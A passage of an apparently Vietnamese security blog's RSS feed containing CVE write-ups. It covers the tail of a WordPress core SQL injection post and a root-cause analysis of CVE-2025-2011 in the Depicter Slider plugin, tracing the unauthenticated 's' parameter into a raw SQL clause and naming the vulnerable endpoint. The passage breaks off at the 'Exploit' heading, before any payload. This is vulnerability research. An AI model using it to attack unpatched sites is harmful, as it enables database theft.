1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;Lỗ hổng &lt;strong&gt;CVE-2022-21661&lt;/strong&gt; trong &lt;strong&gt;WordPress Core&lt;/strong&gt; trước phiên bản &lt;strong&gt;5.8.3&lt;/strong&gt;, quay ngược đến tận phiên bản &lt;strong&gt;3.7.37&lt;/strong&gt;, xuất phát từ việc làm sạch dữ liệu (&lt;strong&gt;sanitization&lt;/strong&gt;) không đúng cách trong &lt;code&gt;WP_Query&lt;/code&gt; dẫn đến lỗ hổng SQL Injection.&lt;/p&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;references&#34;&gt;&lt;span&gt;References&lt;/span&gt;&#xA;  &lt;a href=&#34;#references&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;&lt;a href=&#34;https://portswigger.net/web-security/sql-injection/cheat-sheet&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;SQL Injection cheat sheet - PortSwigger&lt;/a&gt;&lt;/p&gt;&#xA;&lt;p&gt;&lt;a href=&#34;https://www.cve.org/CVERecord?id=CVE-2022-21661&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;CVE-2022-21661 Detail&lt;/a&gt;&lt;/p&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;notes&#34;&gt;&lt;span&gt;Notes&lt;/span&gt;&#xA;  &lt;a href=&#34;#notes&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;div class=&#34;footnotes&#34; role=&#34;doc-endnotes&#34;&gt;&#xA;&lt;hr&gt;&#xA;&lt;ol&gt;&#xA;&lt;li id=&#34;fn:1&#34;&gt;&#xA;&lt;p&gt;Vì patch nằm trong file &lt;strong&gt;src/wp-includes/class-wp-tax-query.php&lt;/strong&gt;, file này định nghĩa class &lt;code&gt;WP_Tax_Query&lt;/code&gt;, chịu trách nhiệm xử lý tham số &lt;code&gt;tax_query&lt;/code&gt; trong &lt;code&gt;WP_Query&lt;/code&gt;. Nếu có thay đổi trong file này thì gần như chắc chắn nó liên quan đến quá trình &lt;strong&gt;parse/validate&lt;/strong&gt; của &lt;code&gt;tax_query&lt;/code&gt;.&amp;#160;&lt;a href=&#34;#fnref:1&#34; class=&#34;footnote-backref&#34; role=&#34;doc-backlink&#34;&gt;&amp;#x21a9;&amp;#xfe0e;&lt;/a&gt;&lt;/p&gt;&#xA;&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;/div&gt;</description>
    </item>
    <item>
      <title>CVE-2025-2011 Analysis &amp; POC</title>
      <link>http://localhost:1313/vi/posts/2025-09-30-cve-2025-2011/</link>
      <pubDate>Tue, 30 Sep 2025 19:08:00 +0700</pubDate><author>w41bu1@gmail.com (Bui Van Y)</author>
      <guid>http://localhost:1313/vi/posts/2025-09-30-cve-2025-2011/</guid>
      <category domain="http://localhost:1313/vi/categories/cve-analysis/">CVE Analysis</category>
      <description>&lt;img src=&#34;http://localhost:1313/posts/2025-09-30-cve-2025-2011/app.png&#34; alt=&#34;featured image&#34; referrerpolicy=&#34;no-referrer&#34;&gt;&lt;p&gt;Lỗ hổng xảy ra trên plugin &lt;strong&gt;Depicter Slider&lt;/strong&gt; của WordPress trước phiên bản &lt;strong&gt;3.6.2&lt;/strong&gt;. Điều này có thể cho phép kẻ tấn công trực tiếp tương tác với cơ sở dữ liệu của bạn, bao gồm không giới hạn ở việc đánh cắp thông tin.&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;strong&gt;CVE ID&lt;/strong&gt;: &lt;a href=&#34;https://www.cve.org/CVERecord?id=CVE-2025-2011&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;CVE-2025-2011&lt;/a&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Product&lt;/strong&gt;: &lt;a href=&#34;https://wordpress.org/plugins/depicter/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;WordPress Depicter Slider Plugin&lt;/a&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Vulnerability Type&lt;/strong&gt;: SQL Injection&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Affected Versions&lt;/strong&gt;: &amp;lt;= 3.6.1&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;CVSS severity&lt;/strong&gt;:  High (9.3)&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Required Privilege&lt;/strong&gt;: Unauthenticated&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;requirements&#34;&gt;&lt;span&gt;Requirements&lt;/span&gt;&#xA;  &lt;a href=&#34;#requirements&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;ul&gt;&#xA;&lt;li&gt;&lt;strong&gt;Local WordPress &amp;amp; Debugging&lt;/strong&gt;: &lt;a href=&#34;https://w41bu1.github.io/2025-08-21-wordpress-local-and-debugging/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;Local WordPress and Debugging&lt;/a&gt;.&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Depicter Slider&lt;/strong&gt;:  v3.6.1(vul) và v3.6.2(fix)&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;diff tool&lt;/strong&gt;: &lt;strong&gt;meld&lt;/strong&gt; hoặc bất cứ tool nào có thể compare để thấy được sự khác biệt giữa 2 version&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;analysis&#34;&gt;&lt;span&gt;Analysis&lt;/span&gt;&#xA;  &lt;a href=&#34;#analysis&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;Nguyên nhân cố lõi do ứng dụng chèn trực tiếp dữ liệu từ &lt;strong&gt;GET&lt;/strong&gt; request vào SQL query mà không có cơ chế kiểm soát chặt chẽ.&lt;/p&gt;&#xA;&lt;h3 class=&#34;heading-element&#34; id=&#34;patch-diff&#34;&gt;&lt;span&gt;Patch Diff&lt;/span&gt;&#xA;  &lt;a href=&#34;#patch-diff&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h3&gt;&lt;p&gt;Dùng diff tool bất kì để so sánh sự khác biệt giữa bản lỗi và bản vá.&#xA;Có sự khác biệt rõ ở file &lt;strong&gt;app/src/Controllers/Ajax/LeadsAjaxController.php&lt;/strong&gt;&lt;/p&gt;&#xA;&lt;p&gt;&lt;code&gt;index&lt;/code&gt;, &lt;code&gt;list&lt;/code&gt;, &lt;code&gt;export&lt;/code&gt; là 3 hàm đáng chú ý nằm trong class &lt;code&gt;LeadsAjaxController&lt;/code&gt;&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;public function index(RequestInterface $request, $view)&#xA;{&#xA;    $args = [&#xA;        &amp;#39;s&amp;#39;         =&amp;gt; Sanitize::textfield($request-&amp;gt;query(&amp;#39;s&amp;#39;, &amp;#39;&amp;#39;)),&#xA;        // other logic&#xA;    ];&#xA;&#xA;    $response   = \Depicter::lead()-&amp;gt;get($args);&#xA;    $statusCode = isset($response[&amp;#39;errors&amp;#39;]) ? 400 : 200;&#xA;&#xA;    return \Depicter::json($response)-&amp;gt;withStatus($statusCode);&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;pre&gt;&lt;code&gt;public function list(RequestInterface $request, $view)&#xA;{&#xA;    $args = [&#xA;        &amp;#39;s&amp;#39;                =&amp;gt; Sanitize::textfield($request-&amp;gt;query(&amp;#39;s&amp;#39;, &amp;#39;&amp;#39;)),&#xA;        // other logic&#xA;    ];&#xA;&#xA;    $response = \Depicter::leadRepository()-&amp;gt;getResults($args);&#xA;&#xA;    return \Depicter::json($response);&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;pre&gt;&lt;code&gt;public function export(RequestInterface $request, $view)&#xA;{&#xA;    $args = [&#xA;        &amp;#39;s&amp;#39;                =&amp;gt; Sanitize::textfield($request-&amp;gt;query(&amp;#39;s&amp;#39;, &amp;#39;&amp;#39;)),&#xA;        // other logic&#xA;    ];&#xA;&#xA;    $response = \Depicter::leadRepository()-&amp;gt;getResults($args);&#xA;&#xA;    // other logic&#xA;&#xA;    return \Depicter::json([&#xA;        &amp;#39;errors&amp;#39; =&amp;gt; [__(&amp;#39;error occurred during the export process&amp;#39;, &amp;#39;depicter&amp;#39;)]&#xA;    ])-&amp;gt;withStatus(400);&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Cả 3 hàm đều được vá bằng cách sử dụng &lt;code&gt;Sanitize::sql&lt;/code&gt; thay cho &lt;code&gt;Sanitize::textfield&lt;/code&gt; nhằm đảm bảo param &lt;code&gt;&#39;s&#39;&lt;/code&gt; được làm sạch và escape phù hợp cho ngữ cảnh câu lệnh SQL.&lt;/p&gt;&#xA;&lt;figure&gt;&lt;img src=&#34;http://localhost:1313/posts/2025-09-30-cve-2025-2011/patch_dif.png&#34;&gt;&lt;figcaption&gt;&#xA;      &lt;h4&gt;Ảnh minh họa sự khác biệt bản vá và bản lỗi&lt;/h4&gt;&#xA;    &lt;/figcaption&gt;&#xA;&lt;/figure&gt;&#xA;&#xA;&lt;h3 class=&#34;heading-element&#34; id=&#34;how-it-work&#34;&gt;&lt;span&gt;How it work?&lt;/span&gt;&#xA;  &lt;a href=&#34;#how-it-work&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h3&gt;&lt;p&gt;Để hiểu rõ hơn chức năng của &lt;code&gt;textfield&lt;/code&gt; và &lt;code&gt;sql&lt;/code&gt; ta tìm kiếm với từ khóa &lt;code&gt;function textfield&lt;/code&gt;, có lẽ chúng được đặt trong cùng 1 file vì được gọi bằng cùng 1 class &lt;code&gt;Sanitize&lt;/code&gt;&lt;/p&gt;&#xA;&lt;blockquote&gt;&#xA;&lt;p&gt;Nếu bạn đã cài &lt;strong&gt;PHP Intelephense Extension&lt;/strong&gt; trong &lt;strong&gt;vscode&lt;/strong&gt;, bạn có thể di chuyển đến hàm cụ thể bằng cách &lt;kbd&gt;Ctrl&lt;/kbd&gt; &lt;kbd&gt;+&lt;/kbd&gt; &lt;kbd&gt;Click&lt;/kbd&gt; vào hàm cần đến.&lt;/p&gt;&#xA;&lt;/blockquote&gt;&#xA;&lt;figure&gt;&lt;img src=&#34;http://localhost:1313/posts/2025-09-30-cve-2025-2011/search_1.png&#34;&gt;&lt;figcaption&gt;&#xA;      &lt;h4&gt;Tìm kiếm hàm textfield trong class Sanitize&lt;/h4&gt;&#xA;    &lt;/figcaption&gt;&#xA;&lt;/figure&gt;&#xA;&#xA;&lt;p&gt;&lt;code&gt;textfield&lt;/code&gt; trả về dữ liệu đã được &lt;strong&gt;sanitize&lt;/strong&gt; bằng &lt;code&gt;sanitize_text_field&lt;/code&gt;, &lt;code&gt;sql&lt;/code&gt; cũng là hàm trong cùng class, trả về dữ liệu đã được &lt;strong&gt;escape SQL&lt;/strong&gt;&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;public static function sql( $input )&#xA;{&#xA;    return esc_sql( $input );&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Vì đây là lỗ hổng &lt;strong&gt;unauthenticated&lt;/strong&gt;, việc có 3 hàm như này, ta cần xác định xem điểm gọi đến chúng có cơ chế xác thực hay không. Chỉ sau khi chắc chắn rằng hàm nào thực sự được gọi trong bối cảnh không yêu cầu xác thực, ta mới tiếp tục phân tích phần logic bên trong để kiểm tra khả năng gây ra SQL Injection giúp giới hạn phạm vi truy vết.&lt;/p&gt;&#xA;&lt;p&gt;Để xác định 3 hàm trên được gọi ở đâu, ta có thể tìm kiếm trực tiếp theo tên hàm. Tuy nhiên, các từ khóa như &lt;code&gt;index&lt;/code&gt;, &lt;code&gt;list&lt;/code&gt;, hay &lt;code&gt;export&lt;/code&gt; lại quá phổ biến nên kết quả tìm kiếm sẽ rất nhiều và khó lọc. Vì vậy, thay vì tìm theo tên hàm, ta tìm với từ khóa là tên class &lt;code&gt;LeadsAjaxController&lt;/code&gt;. Bởi lẽ khi được sử dụng, các hàm này đều phải được gọi thông qua class, nhờ đó phạm vi kết quả tìm kiếm sẽ được thu hẹp và dễ dàng hơn.&lt;/p&gt;&#xA;&lt;figure&gt;&lt;img src=&#34;http://localhost:1313/posts/2025-09-30-cve-2025-2011/search_2.png&#34;&gt;&lt;figcaption&gt;&#xA;      &lt;h4&gt;Kết quả tìm kiếm LeadsAjaxController trong mã nguồn&lt;/h4&gt;&#xA;    &lt;/figcaption&gt;&#xA;&lt;/figure&gt;&#xA;&#xA;&lt;p&gt;👉 &lt;code&gt;LeadsAjaxController&lt;/code&gt; được sử dụng trong quá trình đăng ký &lt;strong&gt;route Ajax&lt;/strong&gt;. Khi có request gửi tới endpoint &lt;code&gt;/wp-admin/admin-ajax.php?action=action_here&amp;amp;param1=param1_here&amp;amp;paramN=paramN_here&lt;/code&gt;, hệ thống sẽ dựa trên khai báo &lt;code&gt;handle(&#39;LeadsAjaxController@function&#39;)&lt;/code&gt; để gọi tới phương thức tương ứng trong class &lt;code&gt;LeadsAjaxController&lt;/code&gt;&lt;/p&gt;&#xA;&lt;p&gt;Cả ba hàm ta đang &lt;strong&gt;focus&lt;/strong&gt; đều được gọi bằng phương thức &lt;strong&gt;GET&lt;/strong&gt;, nhưng &lt;code&gt;export&lt;/code&gt; lại có &lt;strong&gt;middleware&lt;/strong&gt; xử lý &lt;code&gt;csrf-api&lt;/code&gt;, nên ta bỏ qua. Chỉ truy vết &lt;code&gt;index&lt;/code&gt; và &lt;code&gt;list&lt;/code&gt;&lt;/p&gt;&#xA;&lt;p&gt;Khi phân tích hai hàm này, ta thấy trong hàm &lt;code&gt;index&lt;/code&gt;, biến &lt;code&gt;$response&lt;/code&gt; được gán giá trị từ &lt;code&gt;\Depicter::lead()-&amp;gt;get($args)&lt;/code&gt;. Tuy nhiên, phương thức &lt;code&gt;get()&lt;/code&gt; lại tiếp tục gọi đến &lt;code&gt;\Depicter::leadRepository()-&amp;gt;getResults($args)&lt;/code&gt;, tức là cùng một logic mà hàm &lt;code&gt;list&lt;/code&gt; đã gọi trực tiếp. Do đó, ta chọn hàm &lt;code&gt;list&lt;/code&gt; làm điểm truy vết chính.&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;public function list(RequestInterface $request, $view)&#xA;{&#xA;    $args = [&#xA;        &amp;#39;s&amp;#39;                =&amp;gt; Sanitize::textfield($request-&amp;gt;query(&amp;#39;s&amp;#39;, &amp;#39;&amp;#39;)),&#xA;        &amp;#39;ids&amp;#39;              =&amp;gt; Sanitize::textfield($request-&amp;gt;query(&amp;#39;ids&amp;#39;, &amp;#39;&amp;#39;)),&#xA;        &amp;#39;sources&amp;#39;          =&amp;gt; Sanitize::textfield($request-&amp;gt;query(&amp;#39;sources&amp;#39;, &amp;#39;&amp;#39;)),&#xA;        &amp;#39;dateStart&amp;#39;        =&amp;gt; Sanitize::textfield($request-&amp;gt;query(&amp;#39;dateStart&amp;#39;, &amp;#39;&amp;#39;)),&#xA;        &amp;#39;dateEnd&amp;#39;          =&amp;gt; Sanitize::textfield($request-&amp;gt;query(&amp;#39;dateEnd&amp;#39;, &amp;#39;&amp;#39;)),&#xA;        &amp;#39;order&amp;#39;            =&amp;gt; Sanitize::textfield($request-&amp;gt;query(&amp;#39;order&amp;#39;, &amp;#39;DESC&amp;#39;)),&#xA;        &amp;#39;orderBy&amp;#39;          =&amp;gt; Sanitize::textfield($request-&amp;gt;query(&amp;#39;orderBy&amp;#39;, &amp;#39;id&amp;#39;)),&#xA;        &amp;#39;page&amp;#39;             =&amp;gt; Sanitize::int($request-&amp;gt;query(&amp;#39;page&amp;#39;, 1)),&#xA;        &amp;#39;perPage&amp;#39;          =&amp;gt; Sanitize::int($request-&amp;gt;query(&amp;#39;perpage&amp;#39;, 10)),&#xA;        &amp;#39;columns&amp;#39;          =&amp;gt; Sanitize::textfield($request-&amp;gt;query(&amp;#39;columns&amp;#39;, &amp;#39;&amp;#39;)),&#xA;        &amp;#39;includeFields&amp;#39;    =&amp;gt; Sanitize::textfield($request-&amp;gt;query(&amp;#39;includeFields&amp;#39;, false)),&#xA;        &amp;#39;skipCustomFields&amp;#39; =&amp;gt; Sanitize::textfield($request-&amp;gt;query(&amp;#39;skipCustomFields&amp;#39;, false))&#xA;    ];&#xA;&#xA;    $response = \Depicter::leadRepository()-&amp;gt;getResults($args);&#xA;&#xA;    return \Depicter::json($response);&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Để biết &lt;code&gt;getResults&lt;/code&gt; thực thi query như nào, ta tìm kiếm với từ khóa &lt;code&gt;function getResults&lt;/code&gt; hoặc &lt;kbd&gt;Ctrl&lt;/kbd&gt; &lt;kbd&gt;+&lt;/kbd&gt; &lt;kbd&gt;Click&lt;/kbd&gt; vào &lt;code&gt;getResults&lt;/code&gt;&lt;/p&gt;&#xA;&lt;figure&gt;&lt;img src=&#34;http://localhost:1313/posts/2025-09-30-cve-2025-2011/search_3.png&#34;&gt;&lt;figcaption&gt;&#xA;      &lt;h4&gt;Vị trí định nghĩa hàm getResults trong LeadRepository&lt;/h4&gt;&#xA;    &lt;/figcaption&gt;&#xA;&lt;/figure&gt;&#xA;&#xA;&lt;p&gt;👉 Khi tìm kiếm, ta thấy kết quả có hai hàm &lt;code&gt;getResults&lt;/code&gt;. Dựa vào tên class có thể nhận thấy sự liên quan giữa class &lt;code&gt;LeadRepository&lt;/code&gt; và hàm &lt;code&gt;leadRepository()&lt;/code&gt;, nhiều khả năng &lt;code&gt;Depicter::leadRepository()&lt;/code&gt; sẽ trả về một &lt;strong&gt;instance&lt;/strong&gt; của class &lt;strong&gt;LeadRepository&lt;/strong&gt;. Bên cạnh đó, ta có thể dựa vào số lượng tham số truyền vào để xác định chính xác hàm &lt;strong&gt;getResults&lt;/strong&gt; nào mới là hàm cần phân tích.&lt;/p&gt;&#xA;&lt;p&gt;Ta thấy điều kiện &lt;code&gt;if&lt;/code&gt;,khi không có param &lt;code&gt;includeFields&lt;/code&gt; thì &lt;code&gt;getLeadsResults&lt;/code&gt; sẽ được gọi, quan sát &lt;code&gt;getLeadsResults&lt;/code&gt; trong cùng class:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;protected function getLeadsResults( $args ){&#xA;    // Purpose of joining tables is being able to search in leadField values as well&#xA;    $leadTable = $this-&amp;gt;lead()-&amp;gt;getTable();&#xA;    $leads = Lead::new()-&amp;gt;select(&#xA;        &amp;#34;{$leadTable}.id&amp;#34;,&#xA;        &amp;#34;{$leadTable}.source_id&amp;#34;,&#xA;        &amp;#34;{$leadTable}.content_id&amp;#34;,&#xA;        &amp;#34;{$leadTable}.content_name&amp;#34;,&#xA;        &amp;#34;{$leadTable}.created_at&amp;#34;,&#xA;        &amp;#34;lf.name as fieldName&amp;#34;,&#xA;        &amp;#34;lf.value as fieldValue&amp;#34;&#xA;    )-&amp;gt;join( &amp;#34;{$this-&amp;gt;leadField()-&amp;gt;getTable()} AS lf&amp;#34;, &amp;#34;{$leadTable}.id&amp;#34;, &amp;#34;=&amp;#34;, &amp;#34;lf.lead_id&amp;#34; );&#xA;&#xA;    // other logic&#xA;&#xA;    if( ! empty( $args[&amp;#39;s&amp;#39;] ) ){&#xA;        $search = &amp;#34;&amp;#39;%&amp;#34;. $args[&amp;#39;s&amp;#39;] .&amp;#34;%&amp;#39;&amp;#34;;&#xA;        $leads-&amp;gt;appendRawWhere(&amp;#39;AND&amp;#39;, &amp;#34;( lf.value like {$search} OR {$leadTable}.content_name like {$search} )&amp;#34;);&#xA;    }&#xA;&#xA;    $results = $this-&amp;gt;paginate( $leads, $args );&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Ta thấy param &lt;code&gt;s&lt;/code&gt;, nơi được bản vá bảo vệ đã được nối trực tiếp vào câu query bằng hàm &lt;code&gt;appendRawWhere&lt;/code&gt;. Khi đó 1 phần query tương ứng sẽ là:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;AND (lf.value like &amp;#39;%s_here%&amp;#39; OR leadtable.content_name like &amp;#39;%s_here%&amp;#39;)&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;👉 Như vậy khi gửi &lt;strong&gt;GET request&lt;/strong&gt; đến &lt;code&gt;/wp-admin/admin-ajax.php&lt;/code&gt; với params:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;action=depicter-lead-index&amp;amp;s=payload_here&lt;/code&gt;&lt;/pre&gt;&lt;ul&gt;&#xA;&lt;li&gt;&lt;code&gt;list&lt;/code&gt; được gọi với duy nhất param &lt;code&gt;s&lt;/code&gt; được thêm vào &lt;code&gt;$args&lt;/code&gt;, còn lại được set giá trị mặc định&lt;/li&gt;&#xA;&lt;li&gt;&lt;code&gt;getResults&lt;/code&gt; được gọi với đối số &lt;code&gt;$args&lt;/code&gt;&lt;/li&gt;&#xA;&lt;li&gt;Điều kiện &lt;code&gt;if( ! $args[&#39;includeFields&#39;] )&lt;/code&gt; trong &lt;code&gt;getResults&lt;/code&gt; khi &lt;code&gt;includeFields&lt;/code&gt; mặc định là &lt;code&gt;false&lt;/code&gt; =&amp;gt; &lt;code&gt;getLeadsResults&lt;/code&gt; được gọi&lt;/li&gt;&#xA;&lt;li&gt;Thực hiện truy vấn gây lỗi SQLi&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;exploit&#34;&gt;&lt;span&gt;Exploit&lt;/span&gt;&#xA;  &lt;a href=&#34;#exploit&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 